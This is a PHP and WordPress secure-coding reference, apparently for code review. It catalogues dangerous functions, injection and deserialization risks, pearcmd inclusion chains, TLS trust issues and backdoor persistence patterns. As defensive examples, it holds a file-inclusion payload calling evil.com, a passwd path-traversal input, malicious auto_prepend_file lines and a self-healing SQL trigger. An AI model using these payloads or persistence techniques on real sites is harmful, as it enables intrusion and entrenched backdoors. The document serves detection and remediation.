# PHP Security Patterns

## Dangerous Functions

| Function | Risk | CWE | Severity | Safe Alternative |
|----------|------|-----|----------|-----------------|
| `eval($userInput)` | Code injection | CWE-94 | CRITICAL | Avoid entirely |
| `system($cmd)` | Command injection | CWE-78 | CRITICAL | `escapeshellarg()` + specific command |
| `exec($cmd)` | Command injection | CWE-78 | CRITICAL | `escapeshellarg()` |
| `passthru($cmd)` | Command injection | CWE-78 | CRITICAL | Avoid |
| `shell_exec($cmd)` | Command injection | CWE-78 | CRITICAL | Avoid |
| `preg_replace('/e', $input)` | Code execution | CWE-94 | CRITICAL | `preg_replace_callback()` |
| `unserialize($userInput)` | Deserialization RCE | CWE-502 | CRITICAL | `json_decode()` |
| `include($userInput)` | Local/remote file inclusion | CWE-98 | CRITICAL | Allowlist of files |
| `require($userInput)` | File inclusion | CWE-98 | CRITICAL | Static includes only |
| `extract($_GET)` | Variable injection | CWE-621 | HIGH | Access `$_GET['key']` directly |
| `$$varname` | Variable variable injection | CWE-621 | HIGH | Use arrays |
| `assert($userInput)` | Code execution (PHP < 8) | CWE-94 | CRITICAL | Remove or use PHP 8+ |
| `create_function(...)` | Code injection (deprecated) | CWE-94 | CRITICAL | Use closures |
| `file_get_contents($userUrl)` | SSRF | CWE-918 | HIGH | Validate URL, restrict protocols |
| `md5($password)` / `sha1($password)` | Weak password hashing | CWE-916 | HIGH | `password_hash($password, PASSWORD_BCRYPT)` |

## PHP-Specific Vulnerabilities

### Type Juggling (== vs ===)

```php
// DANGEROUS: Loose comparison
if ($_GET['password'] == $storedHash) { ... }
// "0e123456" == "0e654321" is TRUE! (both are 0 in scientific notation)
// "0" == false is TRUE!
// "php" == 0 is TRUE! (non-numeric string cast to 0)

// SAFE: Strict comparison
if ($_GET['password'] === $storedHash) { ... }
// Or use hash_equals() for timing-safe comparison
if (hash_equals($storedHash, hash('sha256', $password))) { ... }
```

### Magic Methods in Deserialization

```php
// These are called automatically during unserialize():
// __wakeup() - on unserialize
// __destruct() - on garbage collection
// __toString() - on string cast
// __call() - on undefined method

// Gadget chain: unserialize → __destruct → file_put_contents → webshell
// NEVER unserialize user input!
```

## Framework-Specific

### Laravel

| Pattern | Risk | Fix |
|---------|------|-----|
| `{!! $userInput !!}` in Blade | XSS (unescaped) | Use `{{ $userInput }}` (escaped) |
| Mass assignment without `$fillable` | Mass assignment | Define `$fillable` or `$guarded` |
| `DB::raw($userInput)` | SQL injection | Use query builder with bindings |
| Missing CSRF `@csrf` on forms | CSRF | Add `@csrf` directive |
| `Storage::get($userPath)` | Path traversal | Validate path, use `basename()` |
| `Route::any()` without auth | Unauthorized access | Add `auth` middleware |

### WordPress

| Pattern | Risk | Fix |
|---------|------|-----|
| `$wpdb->query("... $var")` | SQL injection | `$wpdb->prepare("... %s", $var)` |
| `echo $_GET['x']` in themes | XSS | `echo esc_html($_GET['x'])` |
| Missing nonce checks | CSRF | `wp_verify_nonce()` |
| `update_option()` without capability check | Privilege escalation | `current_user_can()` |
| `wp_remote_get($user_url)` | SSRF | Validate URL |
| `call_user_func($_GET['fn'])` | Arbitrary function call | Allowlist functions |

### Symfony

| Pattern | Risk | Fix |
|---------|------|-----|
| Twig `{{ var\|raw }}` | XSS | Use `{{ var }}` (auto-escaped) |
| Raw Doctrine DQL with concatenation | SQL injection | Use parameters `:param` |
| Missing `#[IsGranted]` on controllers | Unauthorized access | Add access control |

## Common Anti-Patterns

```php
// DANGEROUS: SQL injection
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_GET['id']);

// SAFE: Prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();

// DANGEROUS: File inclusion
include($_GET['page'] . '.php');
// Attacker: ?page=../../etc/passwd%00 (null byte in old PHP)
// Or: ?page=http://evil.com/shell (if allow_url_include=On)

// SAFE: Allowlist
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . '.php');
}
```

## Runtime Configuration and File Inclusion Chains

### `register_argc_argv` + `pearcmd.php` + user-controlled include

When `register_argc_argv` is On, query-string words reach `$argv` in web requests. If an attacker
can make the app `include` PEAR's `pearcmd.php` (shipped with PEAR, for example in many PHP
container images), PEAR commands such as `config-create` can write an attacker-chosen PHP file.
Patchstack observed pearcmd file writes against WordPress hours after the CVE-2026-87902 patch
(D§1: https://patchstack.com/articles/cve-2026-87902-attackers-started-probing-wordpress-sites-hours-after-the-patch/).

| Check | Report when | Skip when | Severity |
|---|---|---|---|
| `register_argc_argv` | A shipped `php.ini`, `conf.d/*.ini`, Dockerfile `RUN echo`, or `.user.ini` sets `register_argc_argv = On`; or a web image runs with no `php.ini` at all (the built-in default is On; `php.ini-production` sets Off) | CLI-only images that serve no web requests | MEDIUM; HIGH with a user-controlled include |
| `pearcmd.php` reachable | `include`/`require` with a user-controlled path anywhere in the app, and PEAR is installed in the image or `include_path` | No user-controlled include exists | CRITICAL when combined with `register_argc_argv` On |
| `allow_url_include = On` | Any shipped ini | none | HIGH |

```ini
; VULNERABLE: shipped php.ini
register_argc_argv = On
allow_url_include = On
; SAFE
register_argc_argv = Off
allow_url_include = Off
```

Also advise turning off `register_argc_argv` in the report for any WordPress host (D§1).

### `.user.ini` / `.htaccess` prepend backdoors (T1505.003)

PHP-FPM and CGI read per-directory `.user.ini` files. `auto_prepend_file` makes every PHP request
in that tree run a chosen file first, which is how the Sucuri "SC" backdoor survived file cleanups
(D§4: https://blog.sucuri.net/2026/09/sc-wordpress-malware-a-self-healing-mesh-of-loaders-drop-ins-and-a-blockchain-controlled-backdoor.html).

```ini
; VULNERABLE (malicious): wp-content/uploads/.user.ini
auto_prepend_file = /var/www/html/wp-content/uploads/2026/10/.cache.php
```

```apache
# VULNERABLE (malicious): .htaccess on mod_php
php_value auto_prepend_file "/tmp/.x.php"
```

- **Report when** any `.user.ini` or `.htaccess` sets `auto_prepend_file` or `auto_append_file`, especially to files under `uploads/`, `/tmp`, hidden names, or paths outside the app. CRITICAL.
- **Skip when** it points to a documented, committed application file (for example a known WAF bootstrap such as a security plugin's documented loader) whose content you have read.
- **Response order (SC backdoor case in `response-order.md`):** neutralize the prepend first, then off-disk copies, cron entries and database triggers, then the files.

## WordPress Persistence and Backdoor Patterns

| Pattern | Report when | Skip when | Severity | Source |
|---|---|---|---|---|
| mu-plugins posing as maintenance tools | A file in `wp-content/mu-plugins/` (always loaded, hidden from the normal Plugins list) has names like "Site Health Cache", "maintenance", "cache helper" and contains `eval`, `base64_decode`, `gzinflate`, remote fetches, user creation, or hooks that hide users or plugins | A known host or agency mu-plugin whose code is plain and documented | CRITICAL | D§2: https://patchstack.com/articles/updraftcentral-key-compromise-wordpress-backdoors/ |
| Hidden admin creation | Plugin or theme code calling `wp_insert_user`/`wp_create_user` with `administrator` or `editor` outside an install flow, or filters on `pre_user_query`/`views_users` that hide accounts | Documented installer that runs once with admin capability checks | CRITICAL | D§4: https://patchstack.com/articles/four-ways-back-in-the-wordpress-xss-campaign-that-hides-its-own-admin-account/ |
| Database triggers that rewrite options or users | SQL migrations, dumps or `$wpdb->query("CREATE TRIGGER ...")` with triggers on `wp_options`, `wp_users` or `wp_usermeta` that set `siteurl`, `active_plugins`, roles or passwords | Triggers on application tables that only maintain counters or timestamps | CRITICAL | D§4 (SC backdoor uses DB triggers): Sucuri link above |
| Planted options used as campaign markers | Code that reads or writes unusual option names such as `fz_emer_done_v1` or `_sync_token` (seed IOCs; the full list lives in the feed) | none | HIGH | D§2, D§4 |
| Remote-management connector keys | Code or config that stores UpdraftCentral or similar remote-control keys in the repo | none | HIGH | D§2: https://teamupdraft.com/blog/security-incident-october-2026/ |

```sql
-- VULNERABLE (malicious): self-healing trigger undoes deactivation of a backdoor plugin
CREATE TRIGGER wp_opt_guard BEFORE UPDATE ON wp_options FOR EACH ROW
BEGIN
  IF NEW.option_name = 'active_plugins' AND NEW.option_value NOT LIKE '%site-health-cache%' THEN
    SET NEW.option_value = OLD.option_value;
  END IF;
END;
```

**Response order (UpdraftCentral case):** if a backdoor plugin is broken, do not repair it (fixing the error activates it); delete the connection key first, then the plugin (D§2).

## TLS Trust in PHP and WordPress

WordPress's HTTP API uses its **bundled** `wp-includes/certificates/ca-bundle.crt` by default, not
the OS trust store, so updating the OS does not change what WordPress trusts. In WordPress 7.1.3
that bundle still included emSign roots after the eMudhra key compromise (D§5:
https://github.com/WordPress/WordPress/blob/7.1.3/wp-includes/certificates/ca-bundle.crt).

| Check | Report when | Skip when | Severity |
|---|---|---|---|
| Vendored CA bundles | Plugins or themes ship their own `cacert.pem`/`ca-bundle.crt`, or code passes `sslcertificates` to `wp_remote_*` pointing at a file in the repo | The path points at the OS bundle (`/etc/ssl/certs/ca-certificates.crt`, `/etc/pki/tls/certs/ca-bundle.crt`) | MEDIUM; HIGH when that client downloads code, updates or packages |
| Disabled verification | `'sslverify' => false`, `CURLOPT_SSL_VERIFYPEER => false`, `CURLOPT_SSL_VERIFYHOST => 0` | Local-only test code | HIGH |
| `curl.cainfo` / `openssl.cafile` in shipped ini | Points at a vendored file | Points at the OS bundle | MEDIUM |

```php
// VULNERABLE: TLS disabled for an update download
wp_remote_get($update_url, ['sslverify' => false]);
// SAFE (interim workaround from D§5): point the HTTP API at the patched OS bundle
add_filter('http_request_args', function ($args) {
    $args['sslcertificates'] = '/etc/ssl/certs/ca-certificates.crt';
    return $args;
});
```

## PHP Runtime Notes

- End-of-life PHP (8.1 and older) gets no official releases; flag `FROM php:8.1*` and older and EOL distro pins (D§3: https://www.bleepingcomputer.com/news/security/php-ships-emergency-patches-for-critical-php2shell-flaws/). Current fixed versions live in the feed.
- After a PHP patch, PHP-FPM workers must be restarted; stale-state bugs survive in long-running workers (D§3: https://www.helpnetsecurity.com/2026/10/21/php2shell-php-vulnerabilities-patched-cve-2026-109618-cve-2026-109619/).
